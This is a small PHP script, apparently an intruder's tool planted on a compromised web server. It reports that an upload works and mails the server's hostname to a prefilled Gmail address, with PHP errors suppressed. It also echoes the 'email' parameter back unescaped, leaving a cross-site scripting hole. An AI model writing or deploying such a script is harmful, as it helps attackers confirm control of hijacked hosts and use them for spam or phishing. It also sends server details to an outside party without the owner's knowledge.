<?php
error_reporting(0);

?>
Upload is <b><color>WORKING</color></b><br>
Check  Mailling ..<br>
<form method="GET">
<input type="text" name="email" value="hbpipe111@gmail.com"required >
<input type="submit" value="Send test >>"Golden-Hacker>
</form>
<br>
<?php
if (!empty($_GET['email'])){
$xx = rand();

$ipp=$_SERVER['SERVER_NAME'];


mail($_GET['email'],"Result Report Test - ".$xx,"Link:$ipp");
print "<b>send an report to [".$_GET['email']."] - $xx</b>"; 
}
?>
